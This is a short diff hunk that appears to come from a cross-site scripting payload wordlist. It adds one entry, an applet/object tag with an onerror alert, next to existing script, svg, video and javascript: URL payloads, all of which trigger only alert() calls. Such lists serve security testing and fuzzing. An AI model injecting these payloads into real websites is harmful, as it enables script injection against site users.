@@ -2197,3 +2197,4 @@ http://www.<script>alert(1)</script .com
 <video onclick=popup=1;>
 location='javascript://\u2028alert(1)';
 <svg onresize="alert(1)">
+<applet/object onerror=alert('XSS')> 
